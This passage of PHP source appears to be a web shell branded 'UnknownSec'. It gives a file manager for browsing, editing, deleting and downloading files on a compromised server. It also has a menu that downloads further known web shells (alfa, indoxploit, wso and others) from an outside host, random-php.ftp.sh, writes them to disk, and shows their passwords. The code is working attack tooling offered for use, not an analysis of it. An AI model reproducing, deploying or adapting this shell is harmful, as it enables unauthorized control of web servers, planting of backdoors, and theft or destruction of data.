print '<strong>Delete folder</strong> fail! '.alt_fail().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
		}
	}
}
print '<div class="table-responsive">
<table class="table table-hover table-dark text-light">
<thead>
<tr>
	<td class="text-center">Name</td>
		<td class="text-center">Type</td>
		<td class="text-center">Last edit</td>
		<td class="text-center">Size</td>
		<td class="text-center">Owner/Group</td>
		<td class="text-center">Permission</td>
	<td class="text-center">Action</td>
</tr>
</thead>
<tbody class="text-nowrap">';		
foreach($scand as $dir){
	$dt = date("Y-m-d G:i", filemtime("$path/$dir"));
	if(strlen($dir) > 25) {
		$_d = substr($dir, 0, 25)."...";		
	}else{
		$_d = $dir;
	}
	if(function_exists('posix_getpwuid')) {
		$downer = @posix_getpwuid(fileowner("$path/$dir"));
		$downer = $downer['name'];
	} else {
		$downer = fileowner("$path/$dir");
	}
	if(function_exists('posix_getgrgid')) {
		$dgrp = @posix_getgrgid(filegroup("$path/$dir"));
		$dgrp = $dgrp['name'];
	} else {
		$dgrp = filegroup("$path/$dir");
	}
	if(!is_dir($path.'/'.$file)) continue;
		$size = filesize($path.'/'.$file)/1024;
		$size = round($size,3);
	if($size >= 1024){
		$size = round($size/1024,2).' MB';
	}else{
		$size = $size.' KB';
	}
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
print "
<tr>
	<td><i class='bi bi-folder-fill'></i><a class='text-decoration-none text-secondary' onclick='c(\"?dir=$path/$dir\")'>$_d</a></td>
	<td class='text-center'>dir</td>
	<td class='text-center'>$dt</td>
	<td class='text-center'>-</td>
	<td class='text-center'>$downer/$dgrp</td>
	<td class='text-center'>";
		if(is_writable($path.'/'.$dir)) echo '<font color="green">';
			elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
		echo p($path.'/'.$dir);
		if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font></center></td>';
print "
	<td class='text-center'>
	<div class='btn-group'>
		<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path/$dir&action=rename_folder\")'><i class='bi bi-pencil-fill'></i></a><a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path/$dir&action=delete_folder\")'><i class='bi bi-trash-fill'></i></a>
	</div>
	</td>
</tr>";
}
foreach($scand as $file){
	$ft = date("Y-m-d G:i", filemtime("$path/$file"));
	if(function_exists('posix_getpwuid')) {
		$fowner = @posix_getpwuid(fileowner("$path/$file"));
		$fowner = $fowner['name'];
	} else {
		$fowner = fileowner("$path/$file");
	}
	if(function_exists('posix_getgrgid')) {
		$fgrp = @posix_getgrgid(filegroup("$path/$file"));
		$fgrp = $fgrp['name'];
	} else {
		$fgrp = filegroup("$path/$file");
	}
	if(!is_file($path.'/'.$file)) continue;
	if(strlen($file) > 25) {
		$_f = substr($file, 0, 25)."...-.".$ext;		
	}else{
		$_f = $file;
	}
print "
<tr>
<td><i class='bi bi-file-earmark-text-fill'></i><a class='text-decoration-none text-secondary' onclick='c(\"?dir=$path&action=view&opn=$file\")'>$_f</a></td>
	<td class='text-center'>file</td>
	<td class='text-center'>$ft</td>
	<td class='text-center'>".sz(filesize($file))."</td>
	<td class='text-center'>$fowner/$fgrp</td>
	<td class='text-center'>";
	if(is_writable($path.'/'.$file)) echo '<font color="green">';
	elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
		echo p($path.'/'.$file);
	if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font></td>';
print "
	<td class='text-center'>
	<div class='btn-group'>
		<a class='btn btn-outline-light btn-sm' title='edit' onclick='c(\"?dir=$path&action=view&opn=$path/$file\")'><i class='bi bi-eye-fill'></i></a>
		<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=edit&opn=$path/$file\")'><i class='bi bi-pencil-square'></i></a>
		<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=rename&opn=$path/$file\")'><i class='bi bi-pencil-fill'></i></a>
		<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=delete_file&opn=$path/$file\")'><i class='bi bi-trash-fill'></i></a>
		<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=download&opn=$path/$file\")'><i class='bi bi-download'></i></a>
	</div>
	</td>
</tr>";
}
?>
</tbody>
</table>
</div>
<?php
switch ($nana['op'])
	{
case ('1'):
switch (true)
	{
case (op('adminer.php', 'https://random-php.ftp.sh/adminer.txt')):
	$ok = '<strong>adminer.php > </strong>ok! '.alt_ok().'</div>';
	}
	break;
case ('2'):
switch (true)
	{
case (op('alfa.php', 'https://random-php.ftp.sh/alfa.txt')):
	$ok = '<strong>alfa.php > </strong>ok! '.alt_ok().'</div>';
	}
	break;
case ('3'):
switch (true)
	{
case (op('indosec.php', 'https://random-php.ftp.sh/ids.txt')):
	$ok = '<strong>indosec.php > </strong>ok! '.alt_ok().'pass: IndoSec</div>';
	}
	break;
case ('4'):
switch (true)
	{
case (op('indoxploit-v2.php', 'https://random-php.ftp.sh/idx-v2.txt')):
	$ok = '<strong>indoxploit-v2.php > </strong>ok! '.alt_ok().'pass: IndoXploit</div>';
	}
	break;
case ('5'):
switch (true)
	{
case (op('indoxploit-v3.php', 'https://random-php.ftp.sh/idx-v3.txt')):
	$ok = '<strong>indoxploit-v3.php > </strong>ok! '.alt_ok().'pass: IndoXploit</div>';
	}
	break;
case ('6'):
switch (true)
	{
case (op('wso.php', 'https://random-php.ftp.sh/wso.txt')):
	$ok = '<strong>wso.php > </strong>ok! '.alt_ok().'pas: ghost287</div>';
	}
	break;
case ('7'):
switch (true)
	{
case (op('fox-wso.php', 'https://random-php.ftp.sh/fox-wso.txt')):
	$ok = '<strong>fox-wso.php > </strong>ok! '.alt_ok().'</div>';
	}
}
print "$ok
<form action='?dir=$path' method='POST'>
<div class='input-group'>
	<select class='form-select form-select-sm' name='op'>
		<option selected disabled>select</option>
		<option value='1'>adminer</option>
		<option value='2'>alfa shell</option>
		<option value='3'>indosec shell</option>
		<option value='4'>indoxploit-v2 shell</option>
		<option value='5'>indoxploit-v3 shell</option>
		<option value='6'>wso shell</option>
		<option value='7'>fox wso shell</option>
	</select>
		<button class='btn btn-outline-light btn-sm'><i class='bi bi-arrow-return-right'></i></button>
	</form>
</div>
	<div class='text-secondary'>&copy; ".date('Y')." UnknownSec</div>";
?>
</div>
</div>
</div>
<script src='//cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js'></script>
<script src='//code.jquery.com/jquery-3.3.1.slim.min.js'></script>
<script src='//cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js'></script>
<script src='//stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js'></script>
</body>
</html>